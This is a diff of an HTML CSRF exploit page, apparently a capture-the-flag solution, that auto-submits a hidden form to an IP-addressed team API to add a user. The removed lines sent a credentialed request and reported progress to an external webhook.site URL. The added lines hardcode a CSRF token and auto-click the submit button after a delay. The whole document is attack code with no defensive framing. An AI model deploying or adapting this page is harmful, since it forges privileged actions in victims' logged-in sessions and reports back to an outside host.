@@ -2,32 +2,13 @@
 <html>
 <body>
   <form id="exploitForm" action="http://52.47.161.102:3000/api/teams/1/addUser/hello" method="POST">
-    <input type="hidden" name="csrfToken" id="csrfTokenInput" value="">
-    <input type="submit" id="installbutton" value="Install">
+    <input type="hidden" name="csrfToken" value="admin_csrf">
+    <input type="submit" id="installButton" value="Install">
   </form>
   <script>
-    function sendWebhook(status, details) {
-      fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
-        method: 'POST',
-        mode: 'cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ status, details, timestamp: new Date().toISOString() })
-      }).catch(err => console.error('Webhook Error:', err.message));
-    }
-    sendWebhook('info', 'Script started');
     setTimeout(() => {
-      fetch('http://52.47.161.102:3000/api/teams/1/addUser/hello', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'csrfToken=',
-        credentials: 'include'
-      }).then(() => {
-        sendWebhook('success', 'API call sent');
-      }).catch(err => {
-        sendWebhook('error', 'Fetch Error: ' + err.message);
-      });
-      document.getElementById('installbutton').click(); // Simulate bot click
-    }, 500); // 500ms delay for bot login
+      document.getElementById('installButton').click();
+    }, 1000);
   </script>
 </body>
 </html>
